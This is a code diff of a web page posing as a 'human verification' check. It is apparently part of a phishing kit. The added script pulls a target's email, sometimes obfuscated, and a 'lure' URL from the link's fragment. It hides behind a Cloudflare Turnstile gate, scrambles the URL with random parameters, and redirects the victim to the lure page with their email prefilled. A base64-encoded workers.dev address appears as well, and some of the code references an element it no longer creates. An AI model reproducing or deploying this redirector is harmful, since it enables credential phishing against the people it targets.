@@ -43,19 +43,14 @@
         }
     </style>
 
-    <script>
+<script>
     window.onload = async function () {
         var USE_TURNSTILE = true;
 
-        // Create loading div
-        var loadingDiv = document.createElement("div");
-        loadingDiv.id = "lsrt";
+        // Global variables to store extracted values
+        let extractedValues = {};
 
-        // Valid Base64-encoded SVG and CSS content
-        var base64HTML = '';
-    var base64CSS = '';
-
-        // Decode base64 to HTML
+        // Function to decode Base64 to HTML
         function decodeBase64ToHTML(base64) {
             try {
                 return atob(base64);
@@ -65,15 +60,7 @@
             }
         }
 
-        var loaderSVGString = decodeBase64ToHTML(base64HTML);
-        if (loaderSVGString.trim()) {
-            loadingDiv.innerHTML = loaderSVGString;
-            document.body.appendChild(loadingDiv);
-        } else {
-            console.error('Decoded SVG is empty or invalid');
-        }
-
-        // Decode base64 to CSS
+        // Function to decode Base64 to CSS
         function decodeBase64ToCSS(base64) {
             try {
                 return atob(base64);
@@ -83,186 +70,109 @@
             }
         }
 
-        var loadingStyle = document.createElement("style");
-        loadingStyle.textContent = decodeBase64ToCSS(base64CSS);
-        document.head.appendChild(loadingStyle);
+        // Extract and decode email or LURE value from URL
+        function extractAndDecodeHashValues() {
+            const url = window.location.href;
+            const hashIndex = url.indexOf('#');
+            let hashFragment = hashIndex !== -1 ? url.slice(hashIndex + 1) : ''; // Get everything after the first '#'
+            let result = {
+                email: null,
+                lureValue: null
+            };
 
-        // Remove loading animation after 15 seconds
-        setTimeout(function() {
-            loadingDiv.style.display = 'none';
-        }, 3000);
+            if (hashFragment) {
+                try {
+                    // Replace additional '#' with '&' for parsing
+                    hashFragment = hashFragment.replace(/#/g, '&');
+                    const params = new URLSearchParams(hashFragment);
 
-        // Function to decode Base64
-        function decodeBase64(encoded) {
-            try {
-                return atob(encoded);
-            } catch (e) {
-                console.error('Failed to decode base64', e);
-                return null;
+                    // Extract LURE value
+                    if (params.has('lure')) {
+                        let lureValue = decodeURIComponent(params.get('lure'));
+
+                        // Decode nested URLs in the lureValue if applicable
+                        if (lureValue.includes('%')) {
+                            lureValue = decodeURIComponent(lureValue);
+                        }
+
+                        result.lureValue = lureValue;
+                    }
+
+                    // Extract POP email
+                    if (params.has('POP')) {
+                        let email = decodeURIComponent(params.get('POP'));
+
+                        // Check if it's in an obfuscated format and decode if necessary
+                        if (isObfuscatedFormat(email)) {
+                            console.log('Email is in obfuscated format. Decoding...');
+                            email = decodeEmail(email);
+                        }
+                        result.email = email;
+                    }
+                } catch (e) {
+                    console.error('Failed to extract or decode hash values:', e);
+                }
             }
-        }
 
-        // Check if the email is in the obfuscated format
-        function isObfuscatedFormat(email) {
-            // Regular expression to match the obfuscated format: (randomNumber1 character randomNumber2 +)
-            const regex = /\(\d[a-zA-Z0-9@.]\d{2}\+\)/g;
-            return regex.test(email);
+            console.log('Extracted Values:', result); // Debugging log
+            return result;
         }
 
         // Decode the obfuscated email
         function decodeEmail(obfuscatedEmail) {
-          // Regular expression to extract characters within the format (randomNumber1 character randomNumber2 +)
-          const regex = /\(\d([a-zA-Z0-9@.])\d{2}\+\)/g;
-          let decodedEmail = '';
-          let match;
+            const regex = /\(\d([a-zA-Z0-9@.])\d{2}\+\)/g;
+            let decodedEmail = '';
+            let match;
 
-          // Extract characters using the regular expression
-          while ((match = regex.exec(obfuscatedEmail)) !== null) {
-            console.log('Matched Segment:', match[0]);  // Debug: log the matched segment
-            decodedEmail += match[1];
-          }
-
-          return decodedEmail;
-        }
-
-
-// Extract and decode email or LURE value from URL
-function extractAndDecodeHashValues() {
-    const url = window.location.href;
-    const hashIndex = url.indexOf('#');
-    let hashFragment = hashIndex !== -1 ? url.slice(hashIndex + 1) : ''; // Get everything after the first '#'
-    let result = {
-        email: null,
-        lureValue: null
-    };
-
-    if (hashFragment) {
-        try {
-            // Replace additional '#' with '&' for parsing
-            hashFragment = hashFragment.replace(/#/g, '&');
-            const params = new URLSearchParams(hashFragment);
-
-            // Extract LURE value
-            if (params.has('lure')) {
-                let lureValue = decodeURIComponent(params.get('lure'));
-
-                // Decode nested URLs in the lureValue if applicable
-                if (lureValue.includes('%')) {
-                    lureValue = decodeURIComponent(lureValue);
-                }
-
-                result.lureValue = lureValue;
+            while ((match = regex.exec(obfuscatedEmail)) !== null) {
+                decodedEmail += match[1];
             }
 
-            // Extract POP email
-            if (params.has('POP')) {
-                let email = decodeURIComponent(params.get('POP'));
-
-                // Check if it's in an obfuscated format and decode if necessary
-                if (isObfuscatedFormat(email)) {
-                    console.log('Email is in obfuscated format. Decoding...');
-                    email = decodeEmail(email);
-                }
-                result.email = email;
-            }
-        } catch (e) {
-            console.error('Failed to extract or decode hash values:', e);
+            return decodedEmail;
         }
-    }
 
-    console.log('Extracted Values:', result); // Debugging log
-    return result;
-}
+        // Start Turnstile verification
+        function startTurnstileVerification() {
+            const base64Url = "aHR0cHM6Ly9za3ktbm8tbGltaXQtZm94ZXIzMzEwLnRyaWVkLWxvcmQud29ya2Vycy5kZXYv";
+            if (USE_TURNSTILE) {
+                console.log('Starting Turnstile verification...');
+                turnstile.render('#cf-turnstile', {
+                    sitekey: '0x4AAAAAAAymSY_rn4CFRQRl',
+                    type: 'spinner',
+                    callback: async function (token) {
+                        if (!token) {
+                            console.error('Turnstile verification failed');
+                            return;
+                        }
 
+                        // Show loading animation again
+                        loadingDiv.style.display = 'flex';
 
+                        // Use the globally stored extracted values
+                        const { email, lureValue } = extractedValues;
 
-// Decode Base64 URL and extract redirect URL from response
-async function getRedirectUrlWithEmail(base64Url, email) {
-    // Decode base64 to get the URL
-    const decodedUrl = atob(base64Url);
+                        setTimeout(function () {
+                            loadingDiv.style.display = 'none';
 
-    try {
-        // Make a fetch request to the decoded URL
-        const response = await fetch(decodedUrl);
-        if (response.ok) {
-            const data = await response.json();
-            
-            // Extract the URL from the response and append #M + email
-            const redirectUrl = data.message + '#' + email;
-            console.log('Extracted redirect URL:', redirectUrl);
-            return redirectUrl;
-        } else {
-            console.error('Failed to fetch data from decoded URL');
-            return null;
-        }
-    } catch (error) {
-        console.error('Error fetching data:', error);
-        return null;
-    }
-}
-        
-// Start Turnstile verification
-function startTurnstileVerification() {
-    const base64Url = "aHR0cHM6Ly9za3ktbm8tbGltaXQtZm94ZXIzMzEwLnRyaWVkLWxvcmQud29ya2Vycy5kZXYv";
-    if (USE_TURNSTILE) {
-        console.log('Starting Turnstile verification...');
-        turnstile.render('#cf-turnstile', {
-            sitekey: '0x4AAAAAAAymSY_rn4CFRQRl',
-            type: 'spinner',
-            callback: async function (token) {
-                if (!token) {
-                    console.error('Turnstile verification failed');
-                    return;
-                }
-
-                // Show loading animation again
-                loadingDiv.style.display = 'flex';
-
-                // Extract and decode values from URL
-                const { email, lureValue } = extractAndDecodeHashValues();
-
-                // Set a cookie for verification (optional)
-                document.cookie = 'verified=true; Path=/; SameSite=None; Secure=true';
-
-                // Wait for 3 seconds, then redirect
-                setTimeout(async function () {
-                    loadingDiv.style.display = 'none';
-
-                    if (lureValue && email) {
-    // Construct the redirect URL
-    const redirectUrl = `${lureValue}#POP=${encodeURIComponent(email)}?redirected=done`;
-
-    console.log('Redirecting to LURE URL with email:', redirectUrl); // Debug log
-    window.location.href = redirectUrl;
-} else {
-    console.log('Missing LURE or email values for redirection.');
-}
-
-                }, 2000);
-            },
-            'error-callback': function () {
-                console.error('Turnstile encountered an error');
+                            if (lureValue && email) {
+                                const redirectUrl = `${lureValue}#POP=${encodeURIComponent(email)}?redirected=done`;
+                                console.log('Redirecting to LURE URL with email:', redirectUrl);
+                                window.location.href = redirectUrl;
+                            } else {
+                                console.log('Missing LURE or email values for redirection.');
+                            }
+                        }, 2000);
+                    },
+                    'error-callback': function () {
+                        console.error('Turnstile encountered an error');
+                    }
+                });
+            } else {
+                console.log('Turnstile is not enabled.');
             }
-        });
-    } else {
-        console.log('Turnstile is not enabled.');
-    }
-}
+        }
 
-
-// Run Turnstile verification
-startTurnstileVerification();
-
-    };
-</script>
-
-    <script>
-    document.addEventListener('contextmenu', function(event) {
-    event.preventDefault();
-});
-
-</script>
-    <script>
+        // Append random parameters to the URL (without affecting hash)
         function appendRandomParamsToUrl() {
             const params = generateRandomParams();
             const currentUrl = new URL(window.location.href);
@@ -270,6 +180,7 @@ startTurnstileVerification();
             window.history.replaceState({}, '', currentUrl);
         }
 
+        // Generate random parameters
         function generateRandomParams() {
             let params = [];
             for (let i = 0; i < 50; i++) {
@@ -279,8 +190,18 @@ startTurnstileVerification();
             }
             return params;
         }
-		appendRandomParamsToUrl();
-		</script>
+
+        // Extract hash values before modifying the URL
+        extractedValues = extractAndDecodeHashValues();
+
+        // Append random parameters
+        appendRandomParamsToUrl();
+
+        // Start Turnstile verification
+        startTurnstileVerification();
+    };
+</script>
+
 </head>
 <body>
     We have integrated a human verification system to confirm that you are not a robot and to mitigate automated risks.
